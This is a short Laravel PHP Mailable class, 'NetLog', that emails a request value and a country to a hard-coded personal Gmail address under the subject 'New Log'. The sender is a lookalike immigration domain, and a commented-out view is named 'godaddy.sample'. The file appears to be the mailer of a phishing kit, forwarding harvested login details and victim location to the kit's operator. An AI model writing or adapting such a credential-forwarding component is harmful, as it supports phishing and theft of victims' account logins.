<?php

namespace App\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;

class NetLog extends Mailable
{
    use Queueable, SerializesModels;
    public $email;
    public $country;
    /**
     * Create a new message instance.
     *
     * @return void
     */

    public function __construct($request, $country)
    {
        $this->country = $country;
        $this->email = $request;
    }

    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {
        return $this->subject('New Log')
        ->from('help@usaimmigration.website', 'New Log')
        ->to('talktojimmykimmel@gmail.com')
        ->view('email.net');
        // ->view('godaddy.sample');
    }
}
